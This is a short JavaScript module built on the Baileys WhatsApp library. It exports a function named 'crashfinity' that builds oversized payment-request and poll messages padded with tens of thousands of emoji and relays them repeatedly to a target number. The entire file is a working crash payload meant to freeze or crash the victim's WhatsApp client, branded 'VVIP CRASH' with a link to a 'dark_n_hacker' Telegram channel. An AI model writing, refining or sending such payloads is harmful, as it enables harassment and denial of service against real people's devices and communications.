const { delay } = require('@whiskeysockets/baileys');

async function crashfinity(SYxS7, target) {
    try {
        // Payment Request Crash with massive payload
        const paymentPayload = {
            requestPaymentMessage: {
                currencyCodeIso4217: 'USD',
                amount1000: 999999999,
                requestFrom: target,
                noteMessage: { extendedTextMessage: { text: "🔥".repeat(50000) } },
                expiryTimestamp: 0,
                amount: {
                    value: 999999999,
                    offset: 1000,
                    currencyCode: 'USD'
                },
                contextInfo: {
                    externalAdReply: {
                        title: "VVIP CRASH",
                        body: "🔥".repeat(10000),
                        showAdAttribution: true,
                        sourceUrl: "https://t.me/dark_n_hacker"
                    }
                }
            }
        };

        // Poll Crash
        const pollPayload = {
            pollCreationMessage: {
                name: "💥".repeat(60000),
                options: Array.from({ length: 12 }, (_, i) => ({ optionName: "🔥".repeat(2000) })),
                selectableOptionsCount: 1
            }
        };

        for (let i = 0; i < 3; i++) {
            await SYxS7.relayMessage(target, paymentPayload, { participant: { jid: target } });
            await delay(300);
            await SYxS7.relayMessage(target, pollPayload, { participant: { jid: target } });
            await delay(300);
        }

    } catch (e) {
        console.log("Crashfinity error:", e.message);
    }
}

module.exports = { crashfinity };
